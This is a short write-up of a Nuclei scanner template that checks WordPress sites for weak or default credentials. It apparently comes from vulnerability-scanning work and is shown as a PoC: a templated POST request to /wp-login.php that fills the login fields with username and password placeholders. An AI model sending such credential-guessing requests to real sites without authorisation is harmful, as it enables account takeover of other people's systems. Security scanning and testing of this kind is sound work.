# Nuclei Template: WordPress - Weak Credentials
**Template ID:** wordpress-weak-credentials
**Vulnerability Class:** Use of Default Credentials
**Severity:** Critical
**CWE:** CWE-1391
**Source:** Nuclei Template (`wordpress-weak-credentials.yaml`)

## Vulnerability Information & PoC

## Description
Weak WordPress Credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}

log={{users}}&pwd={{passwords}}
```

## References
- https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/
